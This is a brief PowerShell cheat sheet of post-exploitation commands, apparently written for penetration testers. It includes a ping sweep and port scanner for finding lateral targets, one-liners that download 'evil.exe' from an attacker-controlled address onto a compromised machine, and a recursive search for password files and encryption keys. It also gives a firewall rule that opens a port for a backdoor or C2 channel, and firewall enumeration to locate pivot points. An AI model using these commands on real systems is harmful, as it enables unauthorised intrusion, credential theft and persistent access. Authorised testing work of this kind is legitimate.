#Ping Sweeper:
#find additional lateral machines post exploitation
1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}

#One line web client
#move files to an exploited machine
Win 7: PS C:\> (New-Object System.Net.WebClient) .DownloadFile("http://10.10.10.10/evil.exe", "c:\evil.exe")

Win8 and later: PS C:\> wget "http://10.10.10.10/evil.exe" -outfile "c:\evil.exe"

#Find something in the file system:
#good for password files, database connection strings, encryption keys, etc.
ls -r c:\path\to\directory -file | % {Select-String -path $_ -pattern STRING}

#Add a firewall rule:
#allow connections into a new port for a listening backdoor, a service ready to deliver and exploit to clients or a pivot.
New-NetFirewallRule -Action Allow -DisplayName Pentester-C2 -RemoteAddress <IPADDR>

#Port-Scanner
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<IPADDR>", $_)) "Port $_ is open!"} 2>$null

#Get Firewall Rules
#can be listed in grid view or CSV
#look for open ports to use for attacks and pivots
Get-NetFirewallRule -all | Out-GridView

Get-NetFirewallRule -all | Export-csv <filepath.csv>





